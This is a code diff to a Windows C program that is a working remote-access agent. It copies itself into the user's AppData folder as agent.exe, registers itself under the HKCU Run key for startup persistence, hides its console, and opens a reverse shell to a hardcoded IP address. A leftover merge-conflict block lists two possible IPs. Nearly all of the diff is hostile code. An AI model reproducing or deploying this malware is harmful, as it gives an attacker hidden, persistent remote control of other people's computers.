@@ -4,9 +4,55 @@
 #include <ws2tcpip.h>
 #pragma comment(lib, "Ws2_32.lib")
 
+void rev_shell();
+void persistance();
 
+int main() {
+    //Get home path
+    const char* username = getenv("USERPROFILE");
+    char filename[MAX_PATH];
+    char newLocation[MAX_PATH];
+    //Setting Path of new location with user home path
+    snprintf(newLocation, sizeof(newLocation), "%s\\AppData\\Local\\Microsoft\\WindowsApps\\agent.exe", username);
+    BOOL stats = 0;
+    //Get file name
+    DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
+    CopyFile(filename, newLocation, stats);
+    //If copied file already exist, go to persistance
+    if (strcmp(filename, newLocation) == 0) {
+        persistance(newLocation);
+    } else {
+        //Copy agent to new location
+        if (CopyFile(filename, newLocation, stats)) {
+            persistance(newLocation);
+        }else{
+            printf("Error copying the file. Error code: %d\n", GetLastError());
+        }
+    }
+}
 
-int main(){
+void persistance(const char* newPath) {
+    //Required Size for Wide Characters
+    int size = MultiByteToWideChar(CP_UTF8, 0, newPath, -1, NULL, 0);
+    //Allocate memory to store converted str
+    wchar_t* proPath = (wchar_t*)malloc(size * sizeof(wchar_t));
+    //Convert Path from char* to wchar_t* (narrow > wide char string)
+    //Match the wide character format (L"string") used in the registry functions.  
+    MultiByteToWideChar(CP_UTF8, 0, newPath, -1, proPath, size);
+    HKEY hkey = NULL;
+    //Create new key in windows start up
+    LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+    //Set value of key - Name is Agent, Value is String and Size is calculated
+    //wcslen for len of string * size of wchar_t for data size
+    LONG status = RegSetValueExW(hkey, L"Agent", 0, REG_SZ, (const BYTE *)proPath, (wcslen(proPath) + 1) * sizeof(wchar_t));
+    if (status == 0) {
+        rev_shell();
+    }else{
+        wprintf(L"RegCreateKeyW failed with error code: %ld\n", createStatus);
+    }
+}
+
+void rev_shell() {
     //Hides cmd
     FreeConsole();
     SOCKET shell;
@@ -14,11 +60,15 @@ int main(){
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     struct sockaddr_in shell_addr;
+<<<<<<< HEAD
     char ip_addr[] = "192.168.137.1";
+=======
+    char ip_addr[] = "192.168.40.131";
+>>>>>>> be7213c651bfdc35e5c35a187322670d3b4ad143
     char RecData[512];
-    int port = 9999;
+    int port = 8081;
     int connection;
-    
+
     //Initializing WinSock Version 2
     WSAStartup(MAKEWORD(2,2), &ver);
     //Create TCP Socket
@@ -60,3 +110,4 @@ int main(){
         memset(RecData, 0, sizeof(RecData));
     }
 }
+
